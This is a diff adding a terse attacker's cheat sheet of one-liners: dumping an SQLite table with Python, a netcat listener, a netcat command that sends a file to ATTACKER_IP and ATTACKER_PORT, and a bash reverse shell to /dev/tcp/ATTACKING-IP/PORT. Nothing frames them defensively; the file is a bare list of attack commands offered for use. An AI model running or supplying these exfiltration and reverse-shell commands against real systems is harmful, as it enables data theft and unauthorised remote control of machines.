@@ -1,0 +1,9 @@
+Read .db files using python
+python -c "import sqlite3; print(sqlite3.connect('database_name.db').cursor().execute('SELECT * FROM table_name').fetchall())"
+
+Netcat
+Listen nc -vnl -s HOST -p PORT
+Copy CLIENT nc -w 3 ATTACKER_IP ATTACKER_PORT < [file_to_download] SERVER nc -l -s HOST -p PORT > [path_to_save]
+
+Bash
+Connections "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKING-IP/PORT 0>&1'"
